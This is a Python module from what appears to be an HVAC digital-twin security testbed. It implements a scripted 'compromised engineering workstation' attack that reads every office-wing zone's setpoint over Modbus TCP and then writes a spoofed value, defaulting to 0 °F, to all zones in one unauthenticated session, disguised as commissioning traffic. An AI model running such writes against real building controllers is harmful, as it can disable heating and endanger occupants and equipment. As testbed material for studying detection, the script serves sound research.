"""Attack scenario #5: a compromised engineering workstation pivoting
setpoints across every office-wing zone at once.

The four earlier scenarios each target the server closet through a
single mechanism -- write, threshold-spoof, response-rewrite, or flood.
This one is different in kind, not mechanism: it's the same plain,
unauthenticated setpoint write as setpoint_spoof.py, but run as a single
scripted session against every zone of the *office wing* rather than one
target, and shaped to look like a legitimate engineering workstation's
commissioning routine -- read each zone's current setpoint first, the way
a technician checking in on a controller would, then write all three in
quick succession. Nothing about the traffic looks anomalous zone by
zone; what makes it an attack is that one actor touched every zone in
the same breath.

The payoff is the "lateral/cascading" impact category from
docs/ROADMAP.md Phase 3: room_1 and room_3 are the office wing's two end
rooms and share no wall (room_2 sits between them). A real physical
fault -- one failed heater, one stuck damper -- hits a single room.
Multiple *non-adjacent* rooms freeze-alarming at the same moment is a
signal an attack caused it, not equipment wearing out.

    uv run python -m hvac_twin.attacks.compromised_ews --setpoint 0

Requires examples/office_wing_controlled.toml's [modbus.slave_server]
(added alongside this scenario) -- each zone's setpoint uses the same
two-address accept/publish split as the closet's, for the same reason
(see that file's own [modbus.slave_server] comment).
"""

from __future__ import annotations

import argparse
from typing import Any

from hvac_twin.attacks._client import wait_for_connection

_ZONE_ACCEPT_ADDRESS = {"room_1": 0, "room_2": 1, "room_3": 2}
_ZONE_PUBLISH_ADDRESS = {"room_1": 3, "room_2": 4, "room_3": 5}
_ALL_ZONES = ("room_1", "room_2", "room_3")


def pivot_zone_setpoints(
    host: str, port: int, setpoint_f: float, zones: tuple[str, ...] = _ALL_ZONES
) -> str:
    """Read each zone's current setpoint (legitimate-looking traffic --
    what a technician's own EWS session would do first), then write the
    same spoofed setpoint to every zone in one session. Returns a
    human-readable summary; raises ConnectionError/RuntimeError rather
    than exiting the process, so this is safe to call from a long-running
    console, not just a one-shot CLI."""
    from pymodbus.client import ModbusTcpClient

    setpoint_tenths = round(setpoint_f * 10)
    client: Any = ModbusTcpClient(host, port=port, timeout=2.0)
    try:
        wait_for_connection(client, host, port)

        before: dict[str, int] = {}
        for zone in zones:
            result = client.read_holding_registers(
                address=_ZONE_PUBLISH_ADDRESS[zone], count=1, device_id=1
            )
            if result.isError():
                raise RuntimeError(f"read failed for {zone}: {result}")
            before[zone] = result.registers[0]

        for zone in zones:
            result = client.write_registers(
                address=_ZONE_ACCEPT_ADDRESS[zone], values=[setpoint_tenths], device_id=1
            )
            if result.isError():
                raise RuntimeError(f"write failed for {zone}: {result}")

        return (
            f"pivoted {len(zones)} zone(s) at {host}:{port} to setpoint_tenths -> "
            f"{setpoint_tenths} ({setpoint_f:.1f} F); previous values were {before} -- "
            "one session, every zone, no authentication required"
        )
    finally:
        client.close()


def main(argv: list[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5040)
    parser.add_argument(
        "--setpoint",
        type=float,
        default=0.0,
        help="spoofed setpoint in degrees F for every zone (default: 0, i.e. 'never heat')",
    )
    parser.add_argument(
        "--zones",
        nargs="+",
        default=list(_ALL_ZONES),
        choices=list(_ALL_ZONES),
        help="zones to pivot (default: all three)",
    )
    args = parser.parse_args(argv)

    try:
        print(pivot_zone_setpoints(args.host, args.port, args.setpoint, tuple(args.zones)))
    except (ConnectionError, RuntimeError) as exc:
        raise SystemExit(str(exc)) from exc


if __name__ == "__main__":
    main()
